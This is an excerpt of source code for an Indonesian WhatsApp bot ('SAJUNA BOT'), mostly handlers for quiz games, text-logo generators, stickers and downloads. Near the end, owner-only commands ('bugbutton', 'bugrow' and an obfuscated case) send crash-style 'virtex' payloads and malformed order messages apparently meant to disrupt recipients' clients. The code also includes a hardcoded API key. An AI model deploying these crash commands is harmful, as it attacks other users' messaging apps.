...
const { yta, igdl, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
...
try {
		...
		const dfrply = fs.readFileSync('./sajuna.jpg')
		cmhit.push(command)
        mess = {
			wait: 'Wait a minute',
			success: 'Success',
		...
		const ownerNumberr = ["6282123384291@s.whatsapp.net"]
		...
		const katalog = (teks) => {
             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "SAJUNA BOT", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             denz.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '120363020906044048@g.us', "inviteCode": 'https://chat.whatsapp.com/CPye80QuKER2DozFEvYy8X', "groupName": `${NamaBot}`, "footerText": "SAJUNA BOT", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
...
const finv = {
	...
	"message": {
		"groupInviteMessage": {
			"groupJid": "120363020906044048@g.us",
...
denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 ...
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
		  ...
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "SAJUNA BOT", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
...
numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
	simi = await fetchJson(`https://simsimi.info/api/?text=${cmd}&lc=id`)
                     sami = simi.success
...
denz.updatePresence(from, Presence.recording)
   ...
   const sotoy = [
	    ...
	    if (isCmd && !isGroup) {console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
	   	if (isGroup && isCmd) {console.log(color('|CMD|', 'yellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'),color(`${groupName}`, 'lightcoral'), color(`${command} [${args.length}]`, 'lemonchiffon'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
     ...
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        ...
        case 'menu':
        case 'help':
        ptod = "6282123384291@s.whatsapp.net" 
        stod = `${sender}`
        uwu = '```'
...
- Hari : ${week} ${weton}
- Tanggal : ${calender}`
sendButLocation(from, `${menu}`, `${uwu}SAJUNA BOT${uwu}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}allmenu`,buttonText:{displayText:'MENU📒'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'DEVELOPER👤'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'SCRIPT🌹'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break
  case 'family100' :
       ...
       case 'tebakanime' :
			...
			if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              denz.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {
       ...
       case 'kuismath' :
			 ...
			 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              ini_buffer = await getBuffer(ini_image)
              denz.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s' }).then(() => {
       ...
       case 'tebakgambar' :
            ...
            denz.sendMessage(from, buff, image, { quoted: mek, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :'+kisi_kisi+'\nWaktu : 30s' }).then(() => {
       ...
       case 'siapaaku' :
              ...
              denz.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
       ...
       case 'tebakkata' :
			...
			if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              denz.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
       ...
       case 'tebaklirik' :
			...
			if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              denz.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
      ...
      case 'tebakjenaka' :
			 ...
			 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              denz.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
       ...
       case 'kimiakuis' :
			...
			if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              denz.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
       ...
       case 'susunkata' :
			...
			if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              denz.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
       ...
       case 'asahotak' :
			 ...
			 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              ...
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.pertanyaan
              denz.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
...
S A J U N A   B O T
${uwu}`
denz.sendMessage(from, menu, text, { quoted: ftrol, thumbnail: fs.readFileSync('./sajuna.jpg'), contextInfo: { mentionedJid: [ptod,dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",mediaType:"2",thumbnail:ofrply,mediaUrl:`https://www.instagram.com/p/Cb2oEGuvJ6y/?utm_source=ig_web_copy_link`}}})
break
 case 'findsticker' :
                      if (isGroup) return reply('THIS COMMAND CAN USED ONLY IN PRIVATE CHAT')     
			     	  if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${settings.lolkey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${settings.lolkey}&img=${x}`)
...
katalog(menu)
break
//Hardianto p yang mana dah bingungpbinggung mana file nya
case 'yuri':
...
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(anu, "imageMessage", { thumbnail: anu, })).imageMessage
              buttonsMessage = {footerText:'SAJUNA BOT', imageMessage: imageMsg,
...
denz.sendMessage(from, hai, image, { quoted: mek, thumbnail: fs.readFileSync('./sajuna.jpg')})
break
...
kon = await getBuffer(hai)
denz.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./sajuna.jpg')})
break
...
buffer = await getBuffer(anu.url)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
              buttonsMessage = {footerText:'SAJUNA BOT', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @wan_awannn`,buttons,headerType:4}
              prep = await denz.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              denz.relayWAMessage(prep) 
...
//Done
case 'nuliskiri':
if (!c) return reply('Textnya mana senpai?')
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
denz.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./sajuna.jpg')})
break
case 'nuliskanan':
if (!c) return reply('Textnya mana senpai?')
reply(mess.wait)
...
denz.sendMessage(from, img, image, { quoted: mek, thumbnail: fs.readFileSync('./sajuna.jpg')})
break
case 'waifu':
reply(mess.wait)
 ...
 case 'blackpink' :
                ...
                reply (mess.wait)
				 ...
				 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${settings.lolkey}&text=${ini_txt}`)
              ...
              denz.relayWAMessage(prep)
			   ...
			   reply (mess.wait)
                    ...
                    txt1 = args[0]
                    txt2 = args[1]
                 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${settings.lolkey}&text1=${txt1}&text2=${txt2}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'KAWAI BOT', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @wan_awannn`,buttons,headerType:4}
              ...
              denz.relayWAMessage(prep)
                ...
                reply (mess.wait)
				   ...
				   if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${settings.lolkey}&text=${ini_txt}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'KAWAI BOTT', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @wan_awannn`,buttons,headerType:4}
              prep = await denz.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              denz.relayWAMessage(prep)
                    ...
                    txt1 = args[0]
                    txt2 = args[1]
						buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/tiktok?apikey=${settings.lolkey}&text1=${txt1}&text2=${txt2}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'KAWAI BOT', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @wan_awannn`,buttons,headerType:4}
			...
			reply (mess.wait)
                    ...
                    txt1 = args[0]
                    txt2 = args[1]
                buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${settings.lolkey}&text1=${txt1}&text2=${txt2}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'KAWAI BOT', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @wan_awannn`,buttons,headerType:4}
              ...
              denz.relayWAMessage(prep)
                ...
                reply (mess.wait)
				 ...
				 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
             buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${settings.lolkey}&text=${ini_txt}`)
               buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'KAWAI BOT', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @wan_awannn`,buttons,headerType:4}
...
case 'comictext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/comic_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'hekerlogo' :
					...
					reply(`[🗿] Buset Hemker`)
					vhbuff = await getBuffer(`https://api.vhtear.com/hacker_avatar?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'graffiti' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/cool_wall_graffiti?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'glowtext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/glow_metallic?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'covertext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/cover_banner?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'narutotext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/naruto_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'erodedtext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/eroded_metal?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'walltext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/the_wall?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'vietteltext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/viettel_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
			case 'valorantbanner':
				...
				denz.sendMessage(from, buffer, image, { quoted: mek, caption: 'Nih Hasilnya...' })
				break
			case 'wingstext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/wings_galaxy?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'halloween' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/halloween_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'graffiti2' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/girl_graffiti?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'graffiti3' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/cartoon_graffiti?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'foiltext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/foil_text?text=VHTEAR&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'bloodtext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/blood_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'hekertext' :
					...
					reply(`[😎] Heker AbiZzz`)
					vhbuff = await getBuffer(`https://api.vhtear.com/matrix_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'bokehtext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/bokeh_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'carbontext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/carbon_text?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'avengerstext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/avengers_text?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'watertext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/water_maker?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'firetext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/fire_maker?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'metaltext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/metal_maker?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'ballontext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/balloonmaker?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'gemboktext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/padlock?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'bannerff' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/bannerff?title=${ve}&text=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'aloklogo' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/logoff?hero=alok&text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'mllogo' :
					...
					if (args.length < 1) return reply(`Text Mana Cuy?\n*Contoh ${prefix}mllogo neko|Ganteng*`)
				ct = body.slice(8)
				ll = ct.split("|")[0];
                l2 = ct.split("|")[1];
				
					
					vhbuff = await getBuffer(`https://api.vhtear.com/logoml?hero=${ll}&text=${l2}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'gamelogo' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/gamelogo?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'blackpink' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/blackpinkicon?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'thundername' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/thundertext?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'silktext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/silktext?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'partytext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/partytext?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'romancetext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/romancetext?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'googletext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/googletext?text1=${ve}&text2=${za}&text3=${ga}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'glowtext2' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/glowtext?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'lovemessage' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'glitchtext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/glitchtext?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'galaxytext' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/galaxytext?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'pornhub' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/pornlogo?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'hartatahta' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/hartatahta?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'wetglass' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/wetglass?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'stylelogo' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/stylelogo?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'watercolor' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/watercolor?text=${q}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break
				case 'wolflogo' :
					...
					vhbuff = await getBuffer(`https://api.vhtear.com/avatarwolf?text1=${ve}&text2=${za}&apikey=${settings.vhtearkey}`)
					denz.sendMessage(from, vhbuff, image, { quoted: mek })
					break

case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} SAJUNA`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./sajuna.jpg')})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} SAJUNA`)
					makell = args.join(" ")
...
client.browserDescription = ['SAJUNA BOT','Desktop','3.0']
...
denz.sendMessage(memekkkk, 'Wkwkwk', MessageType.text)
break
				case 'script':
		case 'sc':
		case 'sourcecode':
		    tekss1 = `https://github.com/Bx101SXR/Whatsapp-Bot`
				 denz.sendMessage(from, tekss1 , text, { quoted: mek })
		break
       case 'debug':
    ...
    "hydratedButtons": [
      {
        "urlButton": {
          ...
          "url": "https://github.com/Bx101SXR/Whatsapp-Bot"
        },
        "index": 0
      }
    ]
	    ...
	    .then(async(result) => {
            for(let i of result.media){
                if(i.url.includes('mp4')){
                    ...
                    denz.sendMessage(from,link,video,{quoted: mek,caption: `FIX BY NEKO`})
                } else {
                    let link = await getBuffer(i.url)
                    denz.sendMessage(from,link,image,{quoted: mek,caption: `FIX BY NEKO`})                  
                }
            }
            });
	    break
...
break
 case 'pinterest' :
		if (args.length == 0) return reply(`Example: ${prefix + command} pantek`)
                    query = args.join(" ")
					anu = await fetchJson(`https://api.vhtear.com/pinterest?query=${query}&apikey=${settings.vhtearkey}`, {method: 'get'})
					var mi = JSON.parse(JSON.stringify(anu.result));
					var ku =  mi[Math.floor(Math.random() * mi.length)];
					nye = await getBuffer(ku)
                    buttons = [{buttonId: `${prefix + command} ${query}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await denz.prepareMessageMedia(nye, "imageMessage", { thumbnail: nye, })).imageMessage
              buttonsMessage = {footerText:'SAJUNA BOT', imageMessage: imageMsg,
...
case 'matrix':
		...
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    ...
		    exec(`webpmux -set exif ./sticker/neko.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
              ...
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				...
				case 'bc':
					...
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						...
						buff = await denz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							denz.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
...
var nn = body.slice(9)
           ...
           case 'fitnahpc':
            ...
            if (!isGroup) return reply(mess.only.group)
              ...
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://telegra.ph/file/ef58260edc6ba47cf573d.jpg`)
...
function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./sajuna.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);denz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
         break
            ...
            "externalAdReply": {
                ...
                "thumbnail": fs.readFileSync(`./sajuna.jpg`),
                "sourceUrl": "https://youtube.com/channel/UCIvY2o-KctmlKWvXzqrXuWw"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        denz.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'SAJUNA🌹'},type:1}])
        denz.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
└ ${prefix}ytmp4 [link yt] = Video`})
			...
			// if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			{
                    ...
                    var media1 = getRandom('.png')
                    fs.writeFileSync(media1, ngebuff)
                    await ffmpeg(`${media1}`)
							.input(media1)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
	 ...
	 case 'telesticker' : 
       case 'telestiker' :
		   ...
		   teks = args.join(' ')
                ...
                exec(`webpmux -set exif ./sticker/neko.exif ./sticker/ttg.webp -o ./sticker/ttg.webp`, async (error) => {
                    if (error) return reply(mess.error.api)
                    denz.sendSticker(from, fs.readFileSync(`./sticker/ttg.webp`), sticker, {quoted: mek})
...
owgi = await  denz.downloadAndSaveMediaMessage(ger)
anu = await imgbb("ae186b21ed78e27ddc054107fdbd9044", owgi)
...
break
  case 'ttp':
                ...
                case 'ttp4':
              //case 'attp':
                    if (args.length == 0) return reply(`Example: ${prefix + command} andre`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${setting.lolkey}&text=${ini_txt}`)
                    await denz.sendMessage(from, ini_buffer, sticker, { quoted: mek })
                    break
			case 'speed':
			case 'ping':
...
Giliran = @${tty.player1.split('@')[0]}`
 denz.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
    ...
